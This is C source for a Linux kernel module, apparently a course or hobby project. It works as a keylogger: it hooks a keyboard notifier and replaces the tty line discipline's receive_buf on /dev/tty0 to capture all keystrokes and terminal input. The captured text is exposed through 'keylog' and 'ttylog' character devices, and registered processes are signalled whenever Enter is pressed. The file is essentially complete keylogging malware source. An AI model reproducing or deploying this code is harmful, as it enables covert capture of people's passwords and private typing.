#include <linux/init.h>
#include <linux/module.h>

#include <linux/slab.h>     /* kmalloc() */
#include <linux/fs.h>       /* everything... */
#include <linux/errno.h>    /* error codes */
#include <linux/types.h>    /* size_t */
#include <linux/proc_fs.h>
#include <linux/fcntl.h>    /* O_ACCMODE */
#include <asm/system.h>     /* cli(), *_flags */
#include <asm/uaccess.h>    /* copy_from/to_user */
#include <asm/string.h>     /* strncpy */

#include <linux/sched.h>
#include <linux/signal.h>

#include <linux/keyboard.h> /* register_keyboard_notifier etc */
#include <linux/tty.h>

#include "keymap.h"

#define print812(...) printk( "<1>812 " ); printk( __VA_ARGS__ ); printk( "\n" );

#define KEYLOG_MAJOR 65
#define KEYLOG_NAME "keylog"
#define TTY_MAJOR 66
#define TTY_NAME "ttylog"

#define MAX_KEYS_TO_BUFFER 1024
#define KEYLOG_BUF_SIZE 1024
#define MAX_REGISTERED_PROCS 5

MODULE_LICENSE( "Dual BSD/GPL" );

struct logged_key {
    char *name;
    int code;
    unsigned int name_len;
};

static struct logged_key *key_buffer;
static unsigned int num_keys_logged = 0;

static char *tty_buffer = NULL, *pid_buffer = NULL;
static int cur_buf_length = 0;
static int cur_ttybuf_length = 0;
static pid_t registered_pids[MAX_REGISTERED_PROCS];
static int registered_proc_count = 0;

static char **curr_keymap = KEYMAP;

static void (*old_receive_buf) (struct tty_struct *tty, const unsigned char *cp,
                        char *fp, int count);
struct file *file;
struct tty_struct *tty;

int key_open( struct inode *inode, struct file *filp );
ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos );
ssize_t tty_read( struct file *filp, char *buf, size_t count, loff_t *f_pos );
ssize_t key_write( struct file *filp, const char *buf, size_t count, loff_t *f_pos );
int key_release( struct inode *inode, struct file *filp );

/**
* Return 1 if key was interpreted as a meta key, 0 otherwise
*/
static int interpret_meta_key( unsigned int keycode, unsigned int down );

struct file_operations fops = {
    read:    key_read,
    write:   key_write,
    open:    key_open,
    release: key_release,
};

struct file_operations ttyops = {
    read:    tty_read,
    write:   key_write,
    open:    key_open,
    release: key_release,
};

int key_open( struct inode *inode, struct file *filp ) {
    print812( "Received an open" );

    return 0;
}

ssize_t key_write( struct file *filp, const char *buf, size_t count, loff_t *f_pos ) {
    char *endptr;
    int  err = 0;

    if ( count >= KEYLOG_BUF_SIZE ) {
        print812( "Writing too many bytes (%zu). Bailing", count );
        return 0;
    }
    
    err = copy_from_user( pid_buffer, buf, count );
    if ( err < 0 ) {
        print812( "Failed copying data from user process (%d)", err );
        return 0;
    }

    pid_t registered_pid = simple_strtol( pid_buffer, &endptr, 10 );
    if ( registered_pid == 0 && endptr == pid_buffer ) {
        print812( "Failed to parse pid" );
        return 0;
    } 

    print812( "PROC SENT: %d", registered_pid );

    int initial_registered_count = registered_proc_count;

    int i=0;
    for( i=0; i<MAX_REGISTERED_PROCS; i++ ) {
        if(registered_pids[i] == registered_pid) {
            print812( "Unregistering process %s", pid_buffer );
            registered_pids[i] = -1;
            registered_proc_count--;   
        }
    }

    if(initial_registered_count == registered_proc_count) {
        if(registered_proc_count < MAX_REGISTERED_PROCS) {
            i=0;
            for( i=0; i<MAX_REGISTERED_PROCS; i++ ) {
                if( registered_pids[i] == -1 ) {
                    print812( "Registering process %s", pid_buffer );
                    registered_pids[i] = registered_pid;
                    registered_proc_count++;
                    break;
                }
            }
        }
    }

    return count;
}

static void free_key( struct logged_key *key ) {
    kfree( key->name );
    key->name = NULL;
    key->name_len = 0;
    key->code = -1;
}

ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
    int err = 0;
    int i;
    struct logged_key *curr = NULL;

    if ( *f_pos == 0 ) {
        for ( i = 0; i < num_keys_logged; i++ ) {
            curr = &key_buffer[i];

            err = copy_to_user( buf + *f_pos, curr->name, curr->name_len );
            if ( err < 0 ) {
                print812( "Copying to user failed (%d)", err );
                return err;
            }

            // Free the key
            *f_pos += curr->name_len;
            free_key( curr );
        }

        num_keys_logged = 0;

        return *f_pos;
    } else {
        return 0;
    }
}

ssize_t tty_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
    int err = 0;

    if ( *f_pos == 0 ) {
        err = copy_to_user( buf, tty_buffer, cur_ttybuf_length );
        if ( err < 0 ) {
            print812( "Copying to user failed (%d)", err );
            return err;
        }

        *f_pos = cur_ttybuf_length;
        cur_ttybuf_length = 0; // Reset buf length to read more content
        return *f_pos;
    } else {
        return 0;
    }
}

struct file* file_open(const char* path, int flags, int rights) {
    struct file* filp = NULL;
    mm_segment_t oldfs;
    int err = 0;
    
    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if(IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }

    return filp;   
}

// Sends the IO signal to let listening processes know a command was entered
void SendKey()
{
    struct siginfo     *sinfo;    /* signal information */

    sinfo = kzalloc( sizeof(struct siginfo), GFP_KERNEL );
    if ( sinfo == NULL ) {
        print812( "Failed to allocate siginfo for signal sending" );
        return;
    }
    sinfo->si_signo = SIGIO;
    sinfo->si_code = SI_USER;
  
    int i=0;
    for(i=0; i<MAX_REGISTERED_PROCS; i++) { 
        struct task_struct *task;

        if( registered_pids[i] != -1  ) {
            task =  pid_task( find_vpid( registered_pids[i] ), PIDTYPE_PID ); 
            if ( task == NULL ) {
                print812( "Failed to find task with pid %d", registered_pids[i] );
                return;
            }

            send_sig_info( SIGIO, sinfo, task );
        }
    }

    if ( sinfo != NULL ) {
        kfree( sinfo );
    }
}

void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
{   
	const char *key_name = NULL; 

    if(registered_proc_count && (count > 0))
    {
        if (!tty->real_raw && !tty->raw)
        {
            char dstStr[count + 1];
            strncpy(dstStr, cp, count);
            dstStr[count] = '\0';
            
            key_name = get_tty_key_str(dstStr, count);

            if ( strlen( key_name ) + cur_ttybuf_length < KEYLOG_BUF_SIZE ) {
                cur_ttybuf_length += sprintf( tty_buffer + cur_ttybuf_length, "%s", key_name );
            }
            
            // Wait until a command has been entered before notifying listeners
            if ( strcmp( "[Enter]", key_name ) == 0  ) {
                SendKey();
            }
        }
    }

    /* call the original receive_buf */
    (*old_receive_buf)(tty, cp, fp, count);
}

int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    char *key_name = NULL;
    unsigned int name_len = 0;
    struct logged_key *next_key = NULL;

    if ( code == KBD_KEYCODE ) {
        // Process and skip key buffering for meta keys
        if ( interpret_meta_key( param->value, param->down ) ) {
            return NOTIFY_OK;
        }

        if ( param->down && registered_proc_count ) {
            if ( num_keys_logged < MAX_KEYS_TO_BUFFER ) {
                key_name = curr_keymap[param->value];
                name_len = strlen( key_name );
                next_key = &key_buffer[num_keys_logged];

                next_key->name = kzalloc( name_len, GFP_KERNEL );
                if ( next_key->name == NULL ) {
                    print812( "Failed to allocate key name buffer - skipping key '%s'", key_name );
                    return NOTIFY_OK;
                }
                next_key->name_len = name_len;
                next_key->code = param->value;

                sprintf( next_key->name, "%s", key_name );

                num_keys_logged++;
            }
        }
    }

    return NOTIFY_OK;
}

static int interpret_meta_key( unsigned int keycode, unsigned int down  ) {
    switch ( keycode ) {
    case 0x1C:
        if ( down ) {
            SendKey();
        }
        return 1;
    case 0x0E:
        if ( down && num_keys_logged > 0 ) {
            free_key( &key_buffer[num_keys_logged - 1] );
            num_keys_logged--;
        }
        return 1;
    case 0x2A:
    case 0x36:
        if ( down ) {
            curr_keymap = SHIFT_KEYMAP;
        } else {
            curr_keymap = KEYMAP;
        }
        return 1;
    }

    return 0;
}

static struct notifier_block keyboardNotifierBlock = {
        .notifier_call = hello_notify
};

int key_release( struct inode *inode, struct file *filp ) {
    print812( "In release method" );

    return 0;
}

static int hello_init( void ) {
    int err;
    print812( "Initializing the module." );

    err = register_chrdev( KEYLOG_MAJOR, KEYLOG_NAME, &fops );
    if ( err < 0 ) {
        print812( "Registering chrdev failed (%d)", err );
        return err;
    }

    err = register_chrdev( TTY_MAJOR, TTY_NAME, &ttyops );
    if ( err < 0 ) {
        print812( "Registering chrdev failed (%d)", err );
        return err;
    }

    key_buffer = kzalloc( sizeof(struct key) * MAX_KEYS_TO_BUFFER, GFP_KERNEL );
    if ( !key_buffer ) {
        err = -ENOMEM;
        print812( "Failed to allocate keybuffer (%d)", err );
        
        unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
        unregister_chrdev( TTY_MAJOR, TTY_NAME );
        
        return err;
    }

    tty_buffer = kzalloc( sizeof(char) * KEYLOG_BUF_SIZE, GFP_KERNEL );
    if ( !tty_buffer ) {
        err = -ENOMEM;
        print812( "Failed to allocate tty buffer (%d)", err );

        unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
        unregister_chrdev( TTY_MAJOR, TTY_NAME );

        return err;
    }

    pid_buffer = kzalloc( sizeof(char) *KEYLOG_BUF_SIZE, GFP_KERNEL );
    if ( !pid_buffer ) {
        err = -ENOMEM;
        print812( "Failed to allocate pidbuffer(%d)", err );

        unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
        unregister_chrdev( TTY_MAJOR, TTY_NAME );

        return err;
    }
    
    int i=0;
    for(i=0; i<MAX_REGISTERED_PROCS; i++) {
        registered_pids[i] = -1;
    }

    register_keyboard_notifier(&keyboardNotifierBlock);
    
    file = file_open("/dev/tty0", O_RDONLY, 0);
    if(file != NULL)
    {
        tty = file->private_data;
        
        if((tty != NULL) && (tty->ldisc != NULL) && (tty->ldisc->ops != NULL) &&
            (tty->ldisc->ops->receive_buf != NULL))
        {
            old_receive_buf = tty->ldisc->ops->receive_buf;
            tty->ldisc->ops->receive_buf = new_receive_buf;
        }
    }

    return 0;
}

static void hello_exit( void ) {
    print812( "Unregistering the module" );

    unregister_keyboard_notifier(&keyboardNotifierBlock);

    if(file != NULL)
    {
        filp_close(file, NULL);
    }
    if((tty != NULL) && (tty->ldisc != NULL) && (tty->ldisc->ops != NULL) && 
        (tty->ldisc->ops->receive_buf != NULL) && (old_receive_buf != NULL))
    {
        tty->ldisc->ops->receive_buf = old_receive_buf;
    }

    unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
    unregister_chrdev( TTY_MAJOR, TTY_NAME );

    if ( key_buffer != NULL ) {
        kfree( key_buffer );
    }

    if ( tty_buffer != NULL ) {
        kfree( tty_buffer );
    }

    if ( pid_buffer != NULL ) {
        kfree( pid_buffer );
    }
}

module_init( hello_init );
module_exit( hello_exit );
